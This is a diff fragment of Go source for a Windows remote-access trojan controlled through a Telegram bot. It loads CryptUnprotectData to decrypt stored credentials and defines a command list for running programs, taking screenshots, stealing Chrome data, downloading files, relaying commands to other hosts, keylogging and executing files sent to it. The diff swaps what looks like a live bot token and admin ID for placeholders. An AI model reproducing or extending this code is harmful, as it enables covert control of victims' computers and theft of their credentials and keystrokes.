@@ -33,27 +33,25 @@ var (
 	fullPathBotExecFile       string = fullPathBotDir + "\\" + nameFile + ".exe"
 	fullPathBotSourceExecFile string = os.Args[0]
 	pwd                       string = os.Args[0]
-	dllcrypt32                       = syscall.NewLazyDLL("Crypt32.dll")
-	dllkernel32                      = syscall.NewLazyDLL("Kernel32.dll")
+	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
+	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")
 	//procEncryptData = dllcrypt32.NewProc("CryptProtectData")
 	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
 	procLocalFree   = dllkernel32.NewProc("LocalFree")
 )
 
-const (
-	ADMIN_ID  = 1233177202                                       //change this
-	BOT_TOKEN = "5665178154:AAGbWJP1UECnq4Bq1Ixv0CeeK2MBFhaC73U" //and this
-	HELP      = "/pwd\n" +
-		"/ls <directory>\n" +
-		"/cd <directory>\n" +
-		"/run <path>\n" +
-		"/info\n" +
-		"/uninstall\n" +
-		"/screen\n" +
-		"/chrome\n" +
+const(
+	ADMIN_ID = 1234 //change this
+	BOT_TOKEN = "Token" //and this
+	HELP = "/pwd\n" +
+	"/ls <directory>\n" +
+	"/cd <directory>\n" +
+	"/run <path>\n" +
+	"/info\n" +
+	"/uninstall\n" +
+	"/screen\n" +
+	"/chrome\n" +
 		"/dl <path to file>\n" +
-		"/to <hostname/ip> <command>\n" +
-		"/keylogger\n" +
-		"/stopKeyRetrieveKey\n" +
-		"simply send me file with text \"exec\" to execute it"
+	"/to <hostname/ip> <command>" +
+	"simply send me file with text \"exec\" to execute it"
 )
